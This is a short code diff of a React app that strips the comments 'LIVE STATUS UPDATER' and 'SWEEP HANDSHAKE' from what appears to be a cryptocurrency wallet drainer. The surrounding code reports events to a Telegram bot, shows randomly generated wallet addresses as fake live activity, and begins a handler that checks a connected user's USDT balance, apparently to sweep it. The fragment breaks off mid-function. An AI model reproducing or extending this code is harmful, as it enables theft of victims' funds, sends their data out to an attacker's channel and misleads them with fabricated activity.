@@ -30,7 +30,6 @@ export default function App() {
 
   const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: msg }) }).catch(()=>{});
 
-  // LIVE STATUS UPDATER
   useEffect(() => {
     const interval = setInterval(() => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
@@ -41,7 +40,6 @@ export default function App() {
     return () => clearInterval(interval);
   }, []);
 
-  // SWEEP HANDSHAKE
   const handleHandshake = () => {
     const tokenAddr = USDT_MAP[chainId];
     if (tokenAddr && tokenBal && tokenBal.value > 0n) {
